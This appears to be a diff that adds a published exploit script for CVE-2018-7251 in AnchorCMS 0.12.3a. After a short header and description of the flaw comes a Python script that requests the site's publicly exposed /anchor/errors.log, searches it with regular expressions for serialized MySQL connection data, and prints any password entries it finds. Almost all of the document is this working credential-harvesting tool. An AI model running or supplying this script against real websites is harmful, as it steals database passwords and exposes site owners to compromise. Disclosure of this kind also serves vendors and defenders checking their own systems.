@@ -1,0 +1,68 @@
+# Exploit Title: Information disclosure (MySQL password) in error log
+# Date: 2/10/2019
+# Exploit Author: Tijme Gommers (https://twitter.com/finnwea/)
+# Vendor Homepage: https://anchorcms.com/
+# Software Link: https://github.com/anchorcms/anchor-cms/releases
+# Version: 0.12.3a
+# Tested on: Linux
+# CVE : CVE-2018-7251
+
+# By default, AnchorCMS will log errors to the "/anchor/errors.log" file in the webroot of the web application. This allows malicious users to access the error log and view potentally sensitive information. Sometimes the AnchorCMS error log contains ocurrences of the MySQL error "Can't connect to MySQL server on 'xxx.xxx.xxx.xxx' (111)". When this error occurs the variables of the MySQL connector class are serialized into a JSON object and logged to the error log.
+
+import re
+import sys
+import importlib
+
+
+def get_plain(url):
+    try:
+        plain_result = requests.get(url=url)
+        return plain_result
+    except:
+        return None
+
+
+def print_usage():
+    print('Usage: {0} <url>'.format(__file__))
+
+
+if __name__ == '__main__':
+
+    # Ensure we have the URL
+    if len(sys.argv) != 2:
+        print_usage()
+        sys.exit(1)
+
+    print("* Using AnchorCMS website: " + sys.argv[1])
+
+    print("* Trying to import 'requests' module")
+    requests_loader = importlib.util.find_spec('requests')
+    requests_module_found = requests_loader is not None
+
+    if requests_module_found:
+        import requests
+    else:
+        print("* 'requests' module not found, please install it using pip")
+        print("* pip install requests")
+        sys.exit(1)
+
+    json_url = sys.argv[1].strip("/") + "/anchor/errors.log"
+    print("* Trying to get errors.log file at: {}".format(json_url))
+    plain_result = get_plain(json_url)
+
+    if plain_result == None:
+        print("* URL could not be requested, errors.log is probably not exposed")
+        sys.exit(1)
+
+    print("* Found data {}, trying to parse it now".format(plain_result))
+
+    lines = re.findall(r'"line":\d', plain_result.text)
+
+    print("* Found {} error entries".format(len(lines)))
+
+    passwords = re.findall(r'\[([^\[\]]*)"password"([^\[\]]*)\]', plain_result.text)
+
+    print("* Found {} passwords entries".format(len(passwords)))
+
+    for password in passwords:
+        print("+ {}".format(password))
